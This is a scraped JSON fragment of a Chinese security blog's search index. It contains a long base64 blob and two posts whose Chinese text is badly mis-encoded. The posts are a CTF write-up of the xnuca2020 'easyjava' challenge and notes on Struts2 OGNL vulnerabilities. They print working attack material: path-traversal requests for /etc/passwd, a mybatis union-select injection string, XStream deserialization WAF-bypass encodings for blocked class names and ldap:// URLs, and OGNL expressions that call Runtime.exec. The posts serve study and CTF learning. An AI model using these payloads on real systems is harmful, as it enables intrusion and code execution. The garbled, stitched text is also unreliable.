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"},{"title":"„ÄêCTF„Äëxnuca2020 easyjava","permalink":"http://blog.0kami.cn/2020/11/02/ctf-xnuca-2020-easyjava/","text":"0x00 ÂâçË®ÄeasyjavaÁöÑËÆæËÆ°ÊÄùË∑Ø‰∏ªË¶ÅÊù•Ê∫ê‰∫éÁé∞ÂÆûÁéØÂ¢É‰∏≠ÈÅáÂà∞ÁöÑ‰∏Ä‰∫õÈóÆÈ¢òÔºå‰ª•ÂèäÊúÄËøëÂàöÂá∫ÁöÑmybatis‰∫åÁ∫ßÁºìÂ≠òÂèçÂ∫èÂàóÂåñÁöÑÂÆâÂÖ®ÈóÆÈ¢òÁöÑ‰∏ÄÁßçËÆæÊÉ≥„ÄÇÈ¢òÁõÆÁöÑËÆæËÆ°ÁõÆÁöÑ‰∏ªË¶ÅËÄÉÂØüÈÄâÊâãÂØπ‰∫éÂÆûÊìçÊÄßÁöÑÊºèÊ¥ûÁöÑÂà©Áî®‰ª•ÂèäÊ∫êÁ†ÅÂÆ°ËÆ°ËÉΩÂäõ„ÄÇ ÂÖ∑‰ΩìÁöÑËÄÉÁÇπÂ¶Ç‰∏ãÔºö ‰ªªÊÑèÊñá‰ª∂‰∏ãËΩΩÔºå/proc/self/fdÁöÑÂà©Áî® mybatisÁºìÂ≠òÂèçÂ∫èÂàóÂåñÊºèÊ¥ûÔºåCVE-2020-26945 xstreamÂèçÂ∫èÂàóÂåñÂà©Áî®ÔºåÁÆÄÂçïÊ≠£ÂàôwafÁªïËøáÔºåÁ±ªÊØîfastjson unicodeÁºñÁ†ÅÁªïËøá È´òÁâàÊú¨javaÁâàÊú¨‰∏ãÁöÑjndiÂà©Áî® 0x01 È¢ÑÊúüÈ¢òËß£È¢òÁõÆÊú¨Ë∫´ËÆæËÆ°ÁöÑÂäüËÉΩÁÇπÊØîËæÉÂ∞ëÔºå‰∏ªË¶ÅÊòØjpgÂõæÁâáÁ≠æÂêçÔºå‰∏ãËΩΩÂíåÈ™åÁ≠æÂäüËÉΩ #1 Ê∫êÁ†ÅËé∑ÂèñËøôÈáåÈ¶ñÂÖàÂÖ≥Ê≥®‰∏ãËΩΩÁöÑÊé•Âè£ Âú®ËøîÂõûÂåÖÈáåÂ≠òÂú®CheckÂ≠óÊÆµÔºå‰∫égetËØ∑Ê±Ç‰∏≠ÁöÑsignÂ≠óÊÆµÊòØ‰∏ÄÊ†∑ÁöÑÂÜÖÂÆπÔºåÂ∞ùËØï‰øÆÊîπfilename‰∏∫../../../../../../etc/passwd checkÂ≠óÊÆµËøîÂõû‰∫Ü‰∏ç‰∏ÄÊ†∑ÁöÑÂÜÖÂÆπÔºåËøôÈáåÂà§Êñ≠ÂèØËÉΩsignÂÄºÁî®‰∫éÊ†°È™åÔºåÈÄöËøáÊâçËøîÂõûÁªìÊûúÔºåÈÇ£‰πà‰øÆÊîπsignÂ≠óÊÆµÔºåÂç≥ÂèØËé∑ÂèñÂà∞ÂΩìÂâçËØ∑Ê±ÇÁöÑÂÜÖÂÆπ„ÄÇÊé•‰∏ãÊù•ÔºåÁî±‰∫éÊòØlinuxÁ≥ªÁªüÔºåÊàë‰ª¨ÂèØ‰ª•ÈÄöËøáÊö¥ÂäõfdÂÄºÊù•Ëé∑ÂèñÂà∞ÂΩìÂâçËøêË°åÁöÑjarÂåÖÂÜÖÂÆπÔºåÂ¶Ç/proc/self/fd/4Êù•Ëé∑ÂèñjarÂåÖ #2 mybatis SQLÊ≥®ÂÖ•ÊãøÂà∞jarÂèçÁºñËØëÂêéÂÖàÁúãpomÔºåÂÖ∂‰∏≠ÊØîËæÉÂÆπÊòìÂÖ≥Ê≥®ÁöÑ‰∏ªË¶ÅÊòØ‰∏§‰∏™jarÂåÖÔºå‰∏Ä‰∏™ÊòØmybatisÁöÑspringbootÂåÖÔºåÂè¶‰∏Ä‰∏™ÊòØxstreamÁöÑÂåÖ Â¶ÇÊûúÂÖ≥Ê≥®cveÂä®ÊÄÅÁöÑËØùÔºåÂèØ‰ª•Áü•ÈÅìÊúÄËøëÂàöÂá∫ÁöÑÊºèÊ¥ûCVE-2020-26945ÔºåËôΩÁÑ∂mybatisÁöÑÁâàÊú¨Â∑≤ÁªèËøõË°å‰∫ÜÂçáÁ∫ßÔºå‰ΩÜspringÁöÑmybatisÂåÖ‰∏≠ÁöÑmybatis‰æùËµñÂπ∂Ê≤°ÊúâÂçáÁ∫ßÔºå‰ªçÁÑ∂ÊòØ3.5.5ÁâàÊú¨ÔºåÂÜçÁ°ÆÂÆö‰∏Ä‰∏ãÔºåÊòØÂê¶ÂêØÁî®‰∫Ücache ‰ªémapperÂØπÂ∫îÁöÑxmlÈÖçÁΩÆÈáåÂèØ‰ª•ÁúãÂà∞ÂºÄÂêØ‰∫ÜcacheÈÖçÁΩÆÔºåÂπ∂‰∏îfindByHashAndSecretÊé•Âè£Â≠òÂú®Ê≥®ÂÖ•„ÄÇ Âà∞ËøôÈáåÂ∞±ÁÆÄÂçï‰∫ÜÔºåÊàë‰ª¨Âè™Ë¶ÅÊâæ‰∏Ä‰∏ãÔºåË∞ÉÁî®ÁÇπÁ°ÆËÆ§ÊòØÂê¶ÂèØÊéßÔºåÂç≥ÂèØÁ°ÆËÆ§ÊòØÂê¶Â≠òÂú®Ê≥®ÂÖ• nese.game.controller.CheckControllerÂ≠òÂú®ÈìæË∑ØÔºå‰ªéÊñá‰ª∂‰∏≠Ëé∑ÂèñÂÜÖÂÆπÔºåÂπ∂ËøõË°åÊï∞ÊçÆÂ∫ìÊü•ËØ¢ÔºåÊâÄ‰ª•ËøôËæπÊàë‰ª¨ËÉΩËææÂà∞‰∏Ä‰∏™Ê≥®ÂÖ•ÁöÑÊïàÊûú #3 mybatis‰∫åÁ∫ßÁºìÂ≠òÂèçÂ∫èÂàóÂåñÊºèÊ¥ûÊé•‰∏ãÊù•ÔºåÁªßÁª≠ËøõË°åÂÆ°ËÆ°ÔºåÂÖ≥Ê≥®‰∏Ä‰∏ãÂè¶‰∏Ä‰∏™ÁÇπxstreamÂåÖÁöÑÂÆâÂÖ®ÈóÆÈ¢ò„ÄÇÂú®nese.game.entity.PictureÂØπË±°‰∏äÔºåË∞ÉÁî®‰∫ÜxstreamÁöÑfromXMLÂáΩÊï∞ÔºåÂπ∂‰∏îÂú®readObjectÂáΩÊï∞Â§ÑÂØπÂ≠óÁ¨¶‰∏≤Á±ªÂûãÁöÑxmlËøõË°åËøòÂéü Âà∞ËøôÈáåÂ∞±ÊØîËæÉÊ∏ÖÊô∞‰∫ÜÔºåÊàë‰ª¨ÈúÄË¶ÅÂà©Áî®ÂâçÈù¢ÂèëÁé∞ÁöÑSQLÊ≥®ÂÖ•ÁÇπÔºåËøõË°åÊ≥®ÂÖ•ÊûÑÈÄ†‰ªªÊÑèÁöÑxmlÊï∞ÊçÆ Âπ∂Âà©Áî®mybatisÁöÑÈªòËÆ§‰∫åÁ∫ßÁºìÂ≠ò‰ΩøÁî®serializationÁöÑÂéüÁêÜÔºàÂ¶Ç‰∏ãÂõæÂÆòÊñπÊñáÊ°£ÊâÄÁ§∫ÔºâÔºåÊù•Ëß¶ÂèëxstreamÂèçÂ∫èÂàóÂåñÊºèÊ¥û Êé•‰∏ãÊù•ÔºåÂ∞±Ê†πÊçÆÈ¢òÁõÆÁöÑÁ≠æÂêçÂÆûÁé∞ÔºåÊù•Ê≥®ÂÖ•‰ªªÊÑèÊï∞ÊçÆÔºå‰ª•Â¶Ç‰∏ã‰ª£Á†Å‰∏∫‰æãÔºåÁîüÊàêÂ≠òÂú®Ê≥®ÂÖ•ËØ≠Âè•ÁöÑjpgÊñá‰ª∂ 1234567891011121314try&#123; String payload = &quot;evil xml&quot;; File file = new File(&quot;xxxx.jpg&quot;); File dest = new File(&quot;xxxx.jpg&quot;); InputStream inputStream = new FileInputStream(file); byte[] bytes = new byte[(int)file.length()]; inputStream.read(bytes); InputStream destInputStream = new FileInputStream(dest); String secret=&quot;&apos; union select 13,&apos;wh1t3p1g&apos;,&apos;wh1t3p1g&apos;,&apos;&quot;+payload+&quot;&apos;,&apos;aed2bebb781ae32d94c5e67185e35149&quot;; String hash = &quot;aed2bebb781ae32d94c5e67185e35149&quot;; ImageUtil.transferTo(inputStream, bytes, null, dest, secret, hash);&#125;catch (Exception e)&#123; e.printStackTrace();&#125; Êèê‰∫§ÂêéÂèØ‰ª•ÁúãÂà∞ÂÖ∑‰ΩìÁöÑÊïàÊûúÔºåÈáçÂ§çÊèê‰∫§‰∏§Ê¨°ÔºåÂç≥ÂèØËß¶ÂèëxmlÁöÑÂèçÂ∫èÂàóÂåñ #4 XStreamÊ≠£ÂàôwafÁªïËøá‰ªéÈ¢òÁõÆ‰∏äÊù•ÁúãÔºåXStreamÁöÑÂÆûÁé∞ÈúÄË¶ÅÁªïËøá‰∏§‰∏™ÁÇπÔºö PureJavaReflectionProvider PureJavaReflectionProvider‰∏çÊîØÊåÅ‰∏çÂ≠òÂú®Êó†ÂèÇÊûÑÈÄ†ÂáΩÊï∞ÁöÑÁ±ªÁöÑËøòÂéüÔºå‰ª•ÂèäËØ•Á±ªÂ¶ÇÊûúÊòØÂèØÂ∫èÂàóÂåñÁöÑÔºåÈÇ£‰πàÂÆÉÁöÑreadObject‰∏çËÉΩÊúâÁ±ªÂ±ûÊÄß‰∏äÁöÑËøòÂéü„ÄÇËøôÊòØÂõ†‰∏∫PureJavaReflectionProviderÂØπ‰∫éÂèçÂ∫èÂàóÂåñÁöÑÊìç‰ΩúÔºåÂπ∂ÈùûÊòØ‰∏Ä‰∏™ÈÄíÂΩíÁöÑËøáÁ®ãÔºåÊúâÁ©∫ÂÜçÂÜôËøô‰∏™ÂàÜÊûêÔºöÔºâ Ê≠£Âàôwaf È¢òÁõÆÂπ∂Ê≤°ÊúâÈÅµÂæ™XStreamÂÆòÊñπÁöÑÁ±ªÁ¶ÅÁî®ÊñπÊ≥ïÔºåËÄåÊòØÈááÁî®Ê≠£ÂàôÁöÑÊñπÂºèÂÖàÂØπÂæÖÂèçÂ∫èÂàóÂåñÁöÑxmlÂ≠óÁ¨¶‰∏≤ËøõË°åÊ£ÄÊµãÔºåÊ£ÄÊµãÈÄöËøáÂêéÂÜçËøõË°åÂèçÂ∫èÂàóÂåñ„ÄÇ ÂÖ≥‰∫éÁ¨¨‰∏Ä‰∏™ÁÇπÔºåÊØîËæÉÂÆπÊòìËß£ÂÜ≥ÔºåÂèÇËÄÉmarshalsecÂØπ‰∫éspring jndiÂà©Áî®ÈìæÁöÑÂÆûÁé∞ÔºåËØ•ÈìæÁ¨¶ÂêàÊàëËØ¥ÁöÑË¶ÅÊ±Ç ËÄåÂØπ‰∫éÁ¨¨‰∫å‰∏™ÁÇπÔºåËøôÈáåÊ≤°ÊúâÁî®ÂÆòÊñπÁöÑÊñπÊ≥ïÔºåÊèêÁ§∫‰∫ÜÊàë‰ª¨ÈúÄË¶ÅÂØπÂ≠óÁ¨¶‰∏≤‰∏äÂÅö‰∫õÊìç‰ΩúÊù•ÁªïËøáÊ≠£Âàôwaf„ÄÇÊàë‰ª¨ÂèÇËÄÉfastjsonÁöÑ@typeÁöÑunicodeÁºñÁ†ÅÁªïËøáÊñπÂºèÔºåÂÜçÁúãÁúãÊòØÂê¶ÂØπ‰∫éXStreamÔºå‰πüÂêåÊ†∑Â≠òÂú®ËøôÁßçÈóÆÈ¢òÔºü Á≠îÊ°àÊòØËÇØÂÆöÁöÑÔºå‰ªãÁªç‰∏Ä‰∏ãXStreamÁöÑÁºñÁ†ÅÁªïËøáÔºö ÈíàÂØπÊ†áÁ≠æÈªëÂêçÂçïÁöÑÁªïËøá ‰ª•spring jndiÂà©Áî®Èìæ‰∏∫Ê°à‰æã 12&lt;org.springframework.aop.support.AbstractBeanFactoryPointcutAdvisor&gt;&lt;/org.springframework.aop.support.AbstractBeanFactoryPointcutAdvisor&gt; ÂΩìÂâçÈªëÂêçÂçï‰∏∫org[.]springframeworkÔºåÊ≠§Êó∂ÁöÑÁªïËøáÊñπÊ≥ïÂèØ‰ª•‰∏∫ 12&lt;org.s_.0070ringframework.aop.support.AbstractBeanFactoryPointcutAdvisor&gt;&lt;/org.s_.0070ringframework.aop.support.AbstractBeanFactoryPointcutAdvisor&gt; ËøôÈáåÁöÑÂéüÁêÜÂú®‰∫éxstream‰ºöÂØπÁ¨¶ÂêàÊ†ºÂºèÁöÑ16ËøõÂà∂ÂÅöËΩ¨Êç¢ com.thoughtworks.xstream.io.xml.AbstractXmlReader#unescapeXmlName com.thoughtworks.xstream.io.xml.XmlFriendlyNameCoder#decodeName 12345678910111213141516171819for (; i &lt; length; i++ ) &#123; char c = name.charAt(i); if (c == dollarReplacementFirstChar &amp;&amp; name.startsWith(dollarReplacement, i)) &#123; i += dollarReplacement.length() - 1; result.append('$'); &#125; else if (c == hexPrefixFirstChar &amp;&amp; name.startsWith(hexPrefix, i)) &#123; // Â§ÑÁêÜhexÊ†ºÂºèÁöÑÊ†áÁ≠æÂÜÖÂÆπÔºåÂÖ∂Ê≠£Á°ÆÊ†ºÂºè‰∏∫_.xxxx i += hexPrefix.length(); c = (char)Integer.parseInt(name.substring(i, i + 4), 16); i += 3; result.append(c); &#125; else if (c == escapeReplacementFirstChar &amp;&amp; name.startsWith(escapeCharReplacement, i)) &#123; i += escapeCharReplacement.length() - 1; result.append('_'); &#125; else &#123; result.append(c); &#125;&#125; ‰ªédollarReplacementÔºåhexPrefixÔºåescapeCharReplacement‰∏âËÄÖÊù•ÁúãÔºåÊúÄÁªà‰∏çÂΩ±ÂìçÊàë‰ª¨ÁªïËøáÁöÑ‰∏∫16ËøõÂà∂ÁöÑÂ§ÑÁêÜ_.xxxxËΩ¨Êç¢ÊàêÂÆûÈôÖÁöÑÂ≠óÁ¨¶„ÄÇ ÈíàÂØπÊ†áÁ≠æÂ±ûÊÄßÂÜÖÂÆπÁöÑÁªïËøá Ê°à‰æã 12&lt;org.springframework.aop.support.AbstractBeanFactoryPointcutAdvisor serialization=\"custom\"&gt;&lt;/org.springframework.aop.support.AbstractBeanFactoryPointcutAdvisor&gt; Ê≠§Êó∂ÁöÑÈªëÂêçÂçï‰∏∫customÔºåÈÇ£‰πàÁªïËøáÊñπÊ≥ïÂèØ‰ª•‰∏∫ 12&lt;org.springframework.aop.support.AbstractBeanFactoryPointcutAdvisor serialization=\"cust&amp;#111;m\"&gt;&lt;/org.springframework.aop.support.AbstractBeanFactoryPointcutAdvisor&gt; ÂéüÁêÜ‰∏∫ËØªÂèñÂ±ûÊÄßÂÜÖÂÆπÊó∂Ôºå‰ºöÂÅöÁ¨¶ÂêàË¶ÅÊ±ÇÁöÑËΩ¨Âåñ com.sun.org.apache.xerces.internal.impl.XMLScanner scanAttributeValue ËØ•ÂáΩÊï∞ÂÜÖÂÆπÊØîËæÉÂ§öÔºå‰∏çË¥¥Âá∫Êù•‰∫ÜÔºå‰ªé883Ë°åÂà∞942Ë°åÂùáÂú®Â§ÑÁêÜhtmlÁºñÁ†ÅÊ†ºÂºèÔºåÂπ∂Â∞ÜÂÖ∂ËΩ¨Âåñ‰∏∫ÂÆûÈôÖÁöÑÂ≠óÁ¨¶ ÊâÄ‰ª•ËøôÈáå&amp;#111;Â∞ÜËΩ¨Âåñ‰∏∫o ÈíàÂØπÊ†áÁ≠æÂÜÖÂÆπÁöÑÁªïËøá Ê°à‰æã 123&lt;test&gt;ldap://xxxxx&lt;/test&gt; Ê≠§Êó∂ÁöÑÈªëÂêçÂçï‰∏∫ldap://ÔºåÂèØ‰ª•Áî®Â¶Ç‰∏ãÁöÑÂá†ÁßçÊñπÊ≥ïÁªïËøá a. htmlÁºñÁ†Å ËøôÈÉ®ÂàÜÂú®ÊèêÂèñÊï∞ÊçÆÊó∂ÔºåÂêåÊ†∑ÂØπhtmlÁºñÁ†ÅÁöÑÂÜÖÂÆπÂÅö‰∫ÜËΩ¨Âåñ 123&lt;test&gt;&amp;#108;dap://xxxxx&lt;/test&gt; ËøôÈÉ®ÂàÜË∑ü‰∏äÈù¢Ê†áÁ≠æÂ±ûÊÄßÂÜÖÂÆπÁöÑÁªïËøáÁöÑ‰∏ÄÊ†∑Ôºå‰∏çÂÜçÂèôËø∞ b. Ê≥®ÈáäÁöÑÊñπÊ≥ï Âú®Â§ÑÁêÜÂÆûÈôÖÁöÑÊ†áÁ≠æÂÜÖÂÆπÊó∂ÔºåÈÅáÂà∞Ê≥®ËßÜÂÜÖÂÆπÂ∞ÜË¢´ÂøΩÁï•Êéâ 123&lt;test&gt;ld&lt;!-- test --&gt;ap://xxxxx&lt;/test&gt; com.thoughtworks.xstream.converters.reflection.AbstractReflectionConverter#unmarshallField com.thoughtworks.xstream.io.xml.AbstractPullReader#getValue 123456789101112131415161718192021222324252627282930public String getValue() &#123; // ... Event event = readEvent(); while (true) &#123; if (event.type == TEXT) &#123; // Â§ÑÁêÜÂ≠óÁ¨¶ String text = event.value; if (text != null &amp;&amp; text.length() &gt; 0) &#123; if (last == null) &#123; last = text; &#125; else &#123; if (buffer == null) &#123; buffer = new StringBuffer(last); &#125; buffer.append(text); &#125; &#125; &#125; else if (event.type != COMMENT) &#123;// ÈùûÂ≠óÁ¨¶ ‰∏î ‰∏çÊòØÊ≥®ÈáäÊó∂ Ë∑≥Âá∫ break; &#125; event = readEvent(); // ÁªßÁª≠ &#125; reset(); if (buffer != null) &#123; return buffer.toString(); &#125; else &#123; return (last == null) ? \"\" : last; &#125;&#125; ‰ªéÂâçÈù¢ÁöÑ‰ª£Á†Å‰∏≠Êù•ÁúãÔºåËøôÈáå‰∏ªË¶ÅÂú®ÂØπÂ≠óÁ¨¶ËøõË°åÊãºÊé•ÔºåÂπ∂‰∏îÈÅáÂà∞Ê≥®ÈáäÊó∂Â∞ÜË∑≥ËøáÔºåÊâÄ‰ª•Â¶ÇÊûúÂú®ÂÜÖÂÆπ‰∏≠Ê∑ª‰∏äÊ≥®Èáä‰πüËÉΩËææÂà∞ÁªïËøáÁöÑÊïàÊûú ÁªèËøá‰∏äÈù¢XStreamÁ±ªÂûãËß£ÊûêÂàÜÊûêÔºåÊàë‰ª¨ÂèØ‰ª•ÊûÑÈÄ†Âá∫ÁªïËøáÊ≠£ÂàôwafÁöÑpayloadÊù• #5 È´òÁâàÊú¨JNDIÊ≥®ÂÖ•ÁöÑÂà©Áî®Âú®ÁîüÊàêÂÖ∑‰ΩìÁöÑexpÂêéÔºåÂèØ‰ª•ÂØπÂ§ñÂèëËµ∑JNDIËøûÊé•ÔºåÂà∞Ëøô‰∏ÄÊ≠•ÔºåÊàë‰ª¨ÈúÄË¶ÅÂéªÂà§Êñ≠ÂÖ∂‰∏∫È´òÁâàÊú¨jdkËøòÊòØ‰ΩéÁâàÊú¨ÁöÑjdk„ÄÇÂ¶ÇÊûúÊòØ‰ΩéÁâàÊú¨ÁöÑjdkÔºåÊàë‰ª¨ÂèØ‰ª•Áõ¥Êé•Âà©Áî®codebaseÂä†ËΩΩ‰ªªÊÑèÁöÑclassÊù•ËææÂà∞ÂëΩ‰ª§ÊâßË°åÁöÑÊïàÊûúÔºåËÄåÈ´òÁâàÊú¨ÁöÑjdkÂè™ËÉΩ‰æùËµñÊú¨Âú∞ObjectFactoryÊàñÊú¨Âú∞Âà©Áî®ÈìæÊù•ËøõË°åÊîªÂáªÔºåÂèÇËÄÉKINGXÁöÑÊñáÁ´†„ÄÇ ËÄåÊú¨È¢òËÄÉÊü•ÁöÑ‰∏∫È´òÁâàÊú¨jdkÁéØÂ¢É‰∏ãÁöÑÂà©Áî®ÔºåÈÇ£‰πàÂ∞±Êúâ‰∏§ÁßçÈÄâÊã©Ôºå‰∏Ä‰∏∫Êú¨Âú∞Âà©Áî®ÈìæËß¶ÂèëÂëΩ‰ª§Êù•ÊâßË°åÔºå‰∫å‰∏∫Êú¨Âú∞ObjectFactoryËææÊàê‰ª£Á†ÅÊâßË°å„ÄÇ ‰ªéÈ¢òÁõÆÁöÑ‰æùËµñÊù•ÁúãÔºåÊàë‰ª¨Âπ∂‰∏çËÉΩÊâæÂà∞‰∏Ä‰∏™ÂêàÈÄÇÁöÑÊú¨Âú∞Âà©Áî®ÈìæÊù•ËææÊàêÂà©Áî®ÔºåÈÇ£‰πàËÄÉÂØüÁöÑÂ∞±ÊòØÁ¨¨‰∫å‰∏™ÊñπÊ≥ïÁöÑÂà©Áî®‰∫Ü„ÄÇÂõ†‰∏∫È¢òÁõÆÁî®ÁöÑÊòØspring boot embedded tomcatÔºåÊâÄ‰ª•Êàë‰ª¨ËÉΩÁõ¥Êé•Âà©Áî®KINGXÂ∏àÂÇÖÊñáÁ´†‰∏≠ÊèêÂà∞ÁöÑÊñπÊ≥ïÔºåÂÖ∑‰ΩìÁöÑÂà©Áî®ËøáÁ®ã‰∏çÊèê‰∫ÜÔºåÂèØ‰ª•Áî®ÊàëÁöÑysomapÊù•ËææÊàêÂëΩ‰ª§ÊâßË°åÁöÑÊïàÊûú 0x02 expexp.java"},{"title":"„Äênotes„Äëstruts2ÂéÜÂè≤ÊºèÊ¥ûÂàÜÊûê","permalink":"http://blog.0kami.cn/2020/05/22/java-talk-about-struts2/","text":"0x00 ÂâçË®Ä 17Âπ¥ÁöÑÊó∂ÂÄôÊï¥ÁêÜËøástruts2Áõ∏ÂÖ≥ÁöÑPOCÔºåÊó∂Èöî3Âπ¥ÔºåËôΩÁÑ∂struts2Â∑≤Áªè‰∏çÂÜçÈÇ£‰πàÊµÅË°å‰∫ÜÔºå‰ΩÜÊòØËøòÊòØÊúâÂæàÂ§ßÁöÑÁ†îÁ©∂‰ª∑ÂÄºÔºåÊú¨ÊñáÂ∞Ü‰∏ÄÁÇπ‰∏ÄÁÇπË∑ü‰∏Ä‰∏ãstruts2 Êúâ‰ª∑ÂÄºÁöÑÊºèÊ¥ûXD 0x01 Âü∫Á°Ä struts2 Ê∫êÁ†Å‰∏ãËΩΩhttps://archive.apache.org/dist/struts/source/ struts2Â∑•‰ΩúÊµÅÁ®ã https://blog.csdn.net/snow_7/article/details/51513381 ognlË°®ËææÂºèhttps://www.cnblogs.com/renchunxiao/p/3423299.html struts2 ÊäÄÊúØÂÜÖÂπï Á¨¨6Á´† OGNL struts2ÊºèÊ¥ûÁöÑ‰∫ßÁîüÈÄöOGNLË°®ËææÂºèÁöÑÊâßË°åÊúâÂæàÂ§ßÁöÑÂÖ≥ËÅîÔºåÂéÜÂè≤‰∏äÂæàÂ§öÁâàÊú¨ÁöÑÊºèÊ¥ûÔºåÈÉΩÊòØÂõ†‰∏∫‰∏çÂÆâÂÖ®ÁöÑÁî®Êà∑ËæìÂÖ•ÊµÅËΩ¨Âà∞‰∫ÜOgnl.getValue„ÄÅOgnl.setValueËÄåÂØºËá¥ÁöÑOGNLË°®ËææÂºèÁöÑËÆ°ÁÆó„ÄÇÂêéÊñá‰∏çÂØπOgnlÂêéÁª≠ÁöÑÂÜÖÂÆπÂÅöÂàÜÊûê 123// Ë∞ÉÁî®ÈùôÊÄÅÂáΩÊï∞ ÊâßË°åÂëΩ‰ª§Ognl.getValue(\"@java.lang.Runtime@getRuntime().exec('open /Applications/Calculator.app/')\", context);Ognl.setValue(\"(\\\"@java.lang.Runtime@getRuntime().exec(\\'open /System/Applications/Calculator.app/\\')\\\")(bla)(bla)\",context,\"\"); Êõ¥Â§öÁî®Ê≥ïÁúãhttp://commons.apache.org/proper/commons-ognl/language-guide.html ÂÖ∂‰∏≠ÂÖ≥‰∫ésetValueÁöÑÂà©Áî®Áî®ÁöÑÊòØExpression EvaluationÈÉ®ÂàÜÔºå(1)(2)(3)‰∏≠(1)(2)Ë¢´‰Ωú‰∏∫‰∏Ä‰∏™Êï¥‰ΩìËß£ÊûêÔºåÂØπ‰∫é(1)ÂÅöË°®ËææÂºèÁöÑËß£ÊûêÔºåÂ¶ÇÊûú‰Ω†Áî®getValue((1)(2))‰ºöÂèëÁé∞ÂÖ∂ÂÆû‰πüËÉΩÊâßË°åÂëΩ‰ª§ÔºåËÄåsetValue((1)(2)(3))ÈúÄË¶Ådouble evaluationÔºåÂÆûÈôÖ‰∏äÂèòÊàê((1)(2))(3)ÔºåÂú®ÂêéÁª≠Ë∞ÉÁî®setValueBodyÂáΩÊï∞Êó∂ÂèñÂá∫ÁöÑchildren[0]Â∞±ÊòØ(1)(2)ÔºåÁ≠âÂêå‰∫éË∞ÉÁî®Ognl.getValue((1)(2))ÁöÑÊïàÊûú„ÄÇÊâÄ‰ª•ËøôÈáåË∞ÉÁî®setValue‰πüÂêåÊ†∑ÂèØ‰ª•ËææÊàêgetValueÁöÑËÆ°ÁÆóOGNLË°®ËææÂºèÁöÑÊïàÊûú„ÄÇ ÂêåÊ†∑ÔºåÊàë‰ª¨‰πüÂèØ‰ª•Âà©Áî®children[1]ÁöÑ‰ΩçÁΩÆÔºåÂ¶Ç(1)((2)(3))ÊääpayloadÊîæÂà∞(2)(3) ÂÖ≥‰∫ésetValueÂáΩÊï∞ÁöÑÂè¶‰∏ÄÁßçÂà©Áî®ÊñπÊ≥ïS2-009ÁöÑÊñπÂºèa[(1)(2)]ÔºåÂÖ∂‰∏≠(1)(2)ÂêéÁª≠‰ºöÂçïÁã¨ÊãøÂá∫Êù•Ë¢´ÂΩì‰ΩúOGNLË°®ËææÂºèÊâßË°å„ÄÇ 0x02 ÂéÜÂè≤ÁâàÊú¨ÂõûÈ°æ 1. S2-001ÂèÇËÄÉÔºöhttps://xz.aliyun.com/t/2044 